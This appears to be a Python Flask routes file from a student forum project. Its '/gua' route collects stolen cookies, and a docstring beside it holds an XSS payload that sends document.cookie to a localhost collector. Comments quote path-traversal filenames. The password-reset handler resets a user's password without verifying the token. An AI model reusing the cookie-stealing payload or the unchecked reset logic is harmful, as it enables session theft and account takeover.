import uuid

from flask import (
    render_template,
    request,
    redirect,
    session,
    url_for,
    Blueprint,
    send_from_directory,
    make_response,
    abort)
import os

from werkzeug.datastructures import FileStorage


from models.reply import Reply
from models.topic import Topic
from models.user import User
from models.token import Token
from models.message import Messages

from routes.helper import current_user

from utils import log

main = Blueprint('index', __name__)


"""
用户在这里可以
    访问首页
    注册
    登录
    用户详细信息

用户登录后, 会写入 session, 并且定向到 /profile
"""


@main.route("/")
def index():
    u = current_user()
    return render_template("index.html", user=u)


@main.route("/register", methods=['GET', 'POST'])
def register():
    form = request.form
    # 用类函数来判断
    u = User.register(form)
    result = '注册成功。'
    return render_template("register.html", result=result)
    # return redirect(url_for('.index'))


@main.route("/login", methods=['GET', 'POST'])
def login():
    form = request.form
    u = User.validate_login(form)
    if u is None:
        # 转到 topic.index 页面
        result = '该用户不存在'
        return render_template('index.html', result=result)
        # log('result', result)
        # http://localhost:3000/?result=%E8%AF%A5%E7%94%A8%E6%88%B7%E4%B8%8D%E5%AD%98%E5%9C%A8
        # http://localhost:3000/?result=该用户不存在
        # return redirect(url_for('.index', result=result))
    else:
        # session 中写入 user_id
        session['user_id'] = u.id
        # 设置 cookie 有效期为 永久
        session.permanent = True
        # return render_template('topic/index.html', user=u)
        return redirect(url_for('topic.index'))


@main.route("/login_view")
def login_view():
    return render_template("login.html")

@main.route('/profile')
def profile():
    u = current_user()
    if u is None:
        return redirect(url_for('.index'))
    else:
        return render_template('profile.html', user=u)


@main.route('/gua')
def gua():
    # xss 攻击的后台
    """
<script>
c = document.cookie
tag = `<img src='http://localhost:2000/gua?cookie=${c}'>`
document.body.insertAdjacentHTML('afterend', tag);
console.log('cookie', c)
console.log('tag', tag)
</script>
    """
    cookie = request.args.get('cookie')
    log('cookie', cookie)
    return 'cookie'


@main.route('/user/<int:id>')
def user_detail(id):
    u = User.one(id=id)
    if u is None:
        abort(404)
    else:
        return render_template('profile.html', user=u)


@main.route("/user/<string:username>")
def user_page(username):
    u = User.one(username=username)
    topics = Topic.all()
    def created_topics(user_id):
        ts = Topic.all(user_id=user_id)
        ts_time = [t.created_time for t in ts]
        ts_time.sort(reverse=True)
        ts1 = []
        for t in ts_time:
            ts1.append(Topic.one(created_time=t))
        return ts1
    def joined_topics(user_id):
        rs = Reply.all(user_id=user_id)
        log("当前参与的话题", rs)
        rs_time = [r.created_time for r in rs]
        rs_time.sort(reverse=True)
        rs1 = []
        for r in rs_time:
             rs1.append(Reply.one(created_time=r))
        ts = []
        for r in rs1:
            t = Topic.one(id=r.topic_id)
            if t in ts:
                continue
            else:
                ts.append(t)
        return ts
    created_topics = created_topics(u.id)
    joined_topics = joined_topics(u.id)
    log("当前参与的话题", joined_topics)
    return render_template("user.html", image=u.image, username=u.username, created_topics=created_topics, joined_topics=joined_topics)

@main.route("/github")
def my_github():
    return render_template("github.html")


@main.route('/image/add', methods=['POST'])
def avatar_add():
    file: FileStorage = request.files['avatar']
    log('fileaaa', file)
    # file = request.files['avatar']
    # filename = file.filename
    # 用户上传数据过滤
    # ../../root/.ssh/authorized_keys
    # images/../../root/.ssh/authorized_keys
    # flask 的处理方法
    # filename = secure_filename(file.filename)
    suffix = file.filename.split('.')[-1]
    if suffix not in ['gif', 'jpg', 'jpeg', 'png']:
        abort(400)
        log('不接受的后缀, {}'.format(suffix))
    else:
        filename = '{}.{}'.format(str(uuid.uuid4()), suffix)
        path = os.path.join('images', filename)
        # path = 'images/' + filename
        log('tupianpath', path)
        file.save(path)
        log('save成功', path)
        u = current_user()
        User.update(u.id, image='/images/{}'.format(filename))

        return redirect(url_for('.profile'))


@main.route('/images/<filename>')
def image(filename):
    # 不要直接拼接路由，不安全，比如
    # http://localhost:3000/images/..%5Capp.py
    # path = os.path.join('images', filename)
    # print('images path', path)
    # return open(path, 'rb').read()
    # if filename in os.listdir('images'):
    #     return
    return send_from_directory('images', filename)

@main.route('/user_setting')
def user_setting():
    u = current_user()
    return render_template('user_setting.html', user=u)


@main.route('/user/basic_setting', methods=['POST',])
def basic_setting():
    u = current_user()
    username = request.form['name']
    signature = request.form['signature']
    User.update(u.id, username=username, signature=signature)
    return render_template('user_setting.html', user=u)

@main.route('/reset/update', methods=['POST', ])
def update():
    tokens = Token.all()
    pwd = request.form['password']
    for t in tokens:
        if t.token != '':
            user_id = int(t.user_id)
            sorted_pwd = User.salted_password(pwd)
            User.update(user_id, password=sorted_pwd)
            result = '重置密码成功'
            return render_template('login.html', result=result)
        else:
            result = '重置密码失败'
            return render_template('login.html', result=result)


@main.route('/user/pwd_setting', methods=['POST',])
def pwd_setting():
    log('程序执行到这里')
    u = current_user()
    old_pass = request.form['old_pass']
    new_pass = request.form['new_pass']
    if u.password == User.salted_password(old_pass):
        u.password = User.salted_password(new_pass)
        User.update(u.id, password=u.password)
        result = '密码修改成功'
        return render_template('user_setting.html', user=u, result=result)
    else:
        result = '密码修改失败'
        return render_template('user_setting.html', user=u, result=result)


@main.route('/reset/send', methods=['GET',])
def send():
    username = request.args['user_name']
    u = User.one(username=username)
    form = dict(
        user_id=u.id,
        token=str(uuid.uuid4()),
    )
    token = Token.new(form)
    log('dsafsdf', token)
    token.save()
    Messages.send(
        title='重置密码邮件',
        # production
        content='http://49.233.80.207/reset/view?token={}'.format(token.token),
        # debug
        # content='http://localhost:3000/reset/view?token={}'.format(token.token),
        sender_id=current_user().id,
        receiver_id=u.id,
    )
    return redirect('/')


@main.route('/reset/view', methods=['GET', 'POST'])
def view():
    log('程序执行到这里')
    token = request.args['token']
    if token != '':
        return render_template('findpwd.html')
    else:
        return redirect('/')


# @main.route('/reset/update', methods=['POST', ])
# def update():
#     tokens = Token.all()
#     # log('dasfasdf', request.form)
#     # log('dasfasdf', request.args)
#     # token = request.args['token']
#     pwd = request.form['password']
#     for t in tokens:
#         if t.token != '':
#             user_id = int(t.user_id)
#             sorted_pwd = User.salted_password(pwd)
#             User.update(user_id, password=sorted_pwd)
#             result = '重置密码成功'
#             return render_template('login.html', result=result)
#         else:
#             result = '重置密码失败'
#             return render_template('login.html', result=result)